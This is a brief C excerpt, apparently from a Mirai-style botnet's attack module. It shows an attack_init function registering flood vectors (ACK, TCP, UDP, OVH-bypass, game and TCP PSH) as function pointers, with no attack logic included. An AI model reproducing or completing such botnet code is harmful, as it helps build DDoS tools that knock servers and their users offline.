...
BOOL attack_init(void)
{
    ...
    add_attack(ATK_VEC_ACKHEX, (ATTACK_FUNC)attack_method_ackhex);
    add_attack(ATK_VEC_TCPHEX, (ATTACK_FUNC)attack_method_tcphex);
    add_attack(ATK_VEC_UDPHEX, (ATTACK_FUNC)attack_method_udphex);
    add_attack(ATK_VEC_OVHHEX, (ATTACK_FUNC)attack_method_ovhhex);
    ...
    add_attack(ATK_VEC_GAME, (ATTACK_FUNC)attack_method_game);
    add_attack(ATK_VEC_HOME, (ATTACK_FUNC)attack_method_home);
    add_attack(ATK_VEC_OVHKILL, (ATTACK_FUNC)attack_method_ovhkill);
    add_attack(ATK_VEC_TCPPSH, (ATTACK_FUNC)attack_method_tcppsh);
